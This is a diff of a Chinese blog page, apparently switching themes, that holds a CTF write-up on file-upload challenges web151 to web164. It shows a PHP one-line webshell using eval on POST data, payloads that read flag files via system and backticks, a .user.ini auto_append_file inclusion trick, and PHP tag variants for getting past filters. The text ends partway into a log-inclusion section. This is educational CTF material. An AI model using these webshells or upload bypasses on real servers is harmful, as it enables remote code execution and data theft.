@@ -1,24 +1,24 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
-  
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Gizz">
-  <meta name="keywords" content="">
-  
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
     <meta name="description" content="web151后端没有验证 直接修改前端代码绕过即可 png改成php或者加上一个php即可   web152后端不严密 抓包修改即可  然后执行php里面一句话木马 发现flag 查看flag内容即可     web153考察.user.inid 的使用 在 PHP 中，user.ini 文件是一个配置文件，它允许用户在没有对全局 php.ini 文件的写权限的情况下，自定义 PHP 的配置。这个">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctf-web文件上传">
@@ -35,274 +35,198 @@
 <meta property="article:published_time" content="2024-09-01T02:02:28.000Z">
 <meta property="article:modified_time" content="2024-09-12T12:22:46.963Z">
 <meta property="article:author" content="Gizz">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/image-20240910152045533.png">
-  
-  
-  
-  <title>ctf-web文件上传 - Gizz&#39;s BLOG</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+<link rel="canonical" href="http://example.com/2024/09/01/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
 
 
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/09/01/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","path":"2024/09/01/web-文件上传/","title":"ctf-web文件上传"}</script>
 
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctf-web文件上传 | Gizz's BLOG</title>
   
 
 
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
 
 
-  
-<meta name="generator" content="Hexo 7.3.0"></head>
 
 
-<body>
-  
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
 
-  <header>
-    
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Fluid</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Gizz's BLOG</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">21</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+  </ul>
 </nav>
 
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web151"><span class="nav-number">1.</span> <span class="nav-text">web151</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web152"><span class="nav-number">2.</span> <span class="nav-text">web152</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web153"><span class="nav-number">3.</span> <span class="nav-text">web153</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web154"><span class="nav-number">4.</span> <span class="nav-text">web154</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web155"><span class="nav-number">5.</span> <span class="nav-text">web155</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web156"><span class="nav-number">6.</span> <span class="nav-text">web156</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web157-158"><span class="nav-number">7.</span> <span class="nav-text">web157 158</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web159"><span class="nav-number">8.</span> <span class="nav-text">web159</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web160"><span class="nav-number">9.</span> <span class="nav-text">web160</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web161"><span class="nav-number">10.</span> <span class="nav-text">web161</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web162"><span class="nav-number">11.</span> <span class="nav-text">web162</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web164"><span class="nav-number">12.</span> <span class="nav-text">web164</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Gizz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="ctf-web文件上传"></span>
-          
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/01/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gizz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Gizz's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctf-web文件上传 | Gizz's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctf-web文件上传
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-01 10:02:28" itemprop="dateCreated datePublished" datetime="2024-09-01T10:02:28+08:00">2024-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-09-12 20:22:46" itemprop="dateModified" datetime="2024-09-12T20:22:46+08:00">2024-09-12</time>
+    </span>
+
+  
+</div>
+
         </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-01 10:02" pubdate>
-          2024年9月1日 上午
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.1k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          10 分钟
-        
-      </span>
-    
+      </header>
 
     
     
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
     
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">ctf-web文件上传</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>后端没有验证 直接修改前端代码绕过即可</p>
+    <div class="post-body" itemprop="articleBody"><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>后端没有验证 直接修改前端代码绕过即可</p>
 <p>png改成php或者加上一个php即可</p>
-<p><img src="/../images/image-20240910152045533.png" srcset="/img/loading.gif" lazyload alt="image-20240910152045533"></p>
+<p><img src="/../images/image-20240910152045533.png" alt="image-20240910152045533"></p>
 <hr>
 <h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端不严密 抓包修改即可</p>
-<p><img src="/../images/image-20240910144707566.png" srcset="/img/loading.gif" lazyload alt="image-20240910144707566"></p>
+<p><img src="/../images/image-20240910144707566.png" alt="image-20240910144707566"></p>
 <p>然后执行php里面一句话木马 发现flag 查看flag内容即可</p>
-<p><img src="/../images/image-20240910144736769.png" srcset="/img/loading.gif" lazyload alt="image-20240910144736769"></p>
-<p><img src="/../images/image-20240910144755239.png" srcset="/img/loading.gif" lazyload alt="image-20240910144755239"></p>
-<p><img src="/../images/image-20240910145023701.png" srcset="/img/loading.gif" lazyload alt="image-20240910145023701"></p>
+<p><img src="/../images/image-20240910144736769.png" alt="image-20240910144736769"></p>
+<p><img src="/../images/image-20240910144755239.png" alt="image-20240910144755239"></p>
+<p><img src="/../images/image-20240910145023701.png" alt="image-20240910145023701"></p>
 <hr>
 <h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>考察.user.inid 的使用</p>
 <p>在 PHP 中，<code>user.ini</code> 文件是一个配置文件，它允许用户在没有对全局 <code>php.ini</code> 文件的写权限的情况下，自定义 PHP 的配置。这个特性在共享托管环境中特别有用，因为用户通常没有权限修改服务器上的全局配置文件。</p>
 <p>.user.ini的配置语句</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> <span class="hljs-built_in">auto</span>_append_file=filename     <span class="hljs-comment">//一个相当于在每个php文件尾加上 include(“filename”)</span><br><span class="hljs-number">2.</span> <span class="hljs-built_in">auto</span>_prepend_file=filename    <span class="hljs-comment">//一个相当于文件头加上 include(“filename”)</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. auto_append_file=filename     //一个相当于在每个php文件尾加上 include(“filename”)</span><br><span class="line">2. auto_prepend_file=filename    //一个相当于文件头加上 include(“filename”)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>根据已有的条件，我们可以构造出思路，先上传.ini文件在里面写入 auto_append_file&#x3D;“1.png”    &#x2F;&#x2F;一个相当于在每个php文件尾加上 include(“1.png”)</p>
 <p>再上传1.png里面写入一句话木马  这样我们就在每一个php文件中包含了1.png文件实现了文件包含 又因为存在一个index.php文件 所以我们直接利用index.php文件进行木马执行即可</p>
 <hr>
 <h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>这题总体思路和上一题一致  不过这里过滤了&lt;?php 所以我们在写一句话木马的时候更换一下标签方式即可</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">php4种常见风格标签写法<br><span class="hljs-number">1</span>：正常写法xml格式<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1111&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-number">2</span>:短标签<br><span class="hljs-meta">&lt;?</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1111&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-number">5.4</span> 起 <span class="hljs-meta">&lt;?=</span> <span class="hljs-string">&#x27;hello&#x27;</span>; === <span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br><br><span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$a</span><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span><br>就相当于<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?</span>需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 --enable-short-tags 选项。<br>而自 PHP5.<span class="hljs-number">4</span> 起，短格式的 <span class="hljs-keyword">echo</span> 标记 <span class="hljs-meta">&lt;?=</span> 总会被识别并且合法，而不管 short_open_tag 的设置是什么。<br><br><br><span class="hljs-number">3</span>:asp风格写法<br>&lt;%<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1111&#x27;</span>;  <br>%&gt;<br><br>(注释：这种写法在php配置中默认关闭了的,如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)但是在php7之后被移除了<br><br><br><span class="hljs-number">4</span>:长标签风格<br><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br><br><br>XXXXXX<br><br>&lt;/script&gt;<br>在php7之后被移除了<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">php4种常见风格标签写法</span><br><span class="line">1：正常写法xml格式</span><br><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;1111&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2:短标签</span><br><span class="line">&lt;?</span><br><span class="line">    echo &#x27;1111&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">5.4 起 &lt;?= &#x27;hello&#x27;; === &lt;? echo &#x27;hello&#x27;;</span><br><span class="line"></span><br><span class="line">&lt;?=$a?&gt;</span><br><span class="line">&lt;?=(表达式)?&gt;</span><br><span class="line">就相当于</span><br><span class="line">&lt;?php echo $a?&gt;</span><br><span class="line">&lt;?php echo (表达式)?&gt;</span><br><span class="line">&lt;?需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 --enable-short-tags 选项。</span><br><span class="line">而自 PHP5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3:asp风格写法</span><br><span class="line">&lt;%</span><br><span class="line">    echo &#x27;1111&#x27;;  </span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">(注释：这种写法在php配置中默认关闭了的,如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)但是在php7之后被移除了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4:长标签风格</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XXXXXX</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">在php7之后被移除了</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>同上</p>
@@ -310,24 +234,24 @@
 <h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>过滤了[]  那用{}代替即可<?=eval($_POST{1});?></p>
 <hr>
 <h3 id="web157-158"><a href="#web157-158" class="headerlink" title="web157 158"></a>web157 158</h3><p>又过滤了分号 {} 就不写一句话木马了 直接输出文件内容即可</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">图片木马内容<br> <br>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac ../f*`</span><span class="hljs-string">?&gt;</span><br> <br>或者<br> <br>&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>)<span class="hljs-string">?&gt;</span><br> <br>因为有<span class="hljs-string">?&gt;</span>闭合所以可以不用;结尾<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">图片木马内容</span><br><span class="line"> </span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br><span class="line"> </span><br><span class="line">或者</span><br><span class="line"> </span><br><span class="line">&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br><span class="line"> </span><br><span class="line">因为有?&gt;闭合所以可以不用;结尾</span><br></pre></td></tr></table></figure>
 
 <h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>过滤了括号</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac ../f*`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>日志文件包含是指我们包含access.log文件 这个日志文件会记录我们访问网站的一些内容信息参数  </p>
-<p>例如 <img src="/../images/image-20240912161927942.png" srcset="/img/loading.gif" lazyload alt="image-20240912161927942"></p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$remote</span>_addr   客户端地址   172.17.0.1</span><br><span class="hljs-meta"><span class="hljs-keyword">$remote</span>_user   客户端用户名称 --</span><br><span class="hljs-meta"><span class="hljs-keyword">$time</span>_local    访问时间和时区 [29/Dec/2022:10:17:14 +0000]</span><br><span class="hljs-meta"><span class="hljs-keyword">$request</span>   请求的URI和HTTP协议   &quot;GET /test/nginx/proxy HTTP/1.1&quot;</span><br><span class="hljs-meta"><span class="hljs-keyword">$http</span>_host 请求地址，即浏览器中你输入的地址（IP或域名） 10.1.7.33</span><br><span class="hljs-meta"><span class="hljs-keyword">$status</span>    HTTP请求状态    200</span><br><span class="hljs-meta"><span class="hljs-keyword">$upstream</span>_status   upstream状态  200</span><br><span class="hljs-meta"><span class="hljs-keyword">$body</span>_bytes_sent   发送给客户端文件内容大小    38</span><br><span class="hljs-meta"><span class="hljs-keyword">$http</span>_referer  url跳转来源 - </span><br><span class="hljs-meta"><span class="hljs-keyword">$http</span>_user_agent   用户终端浏览器等信息  &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 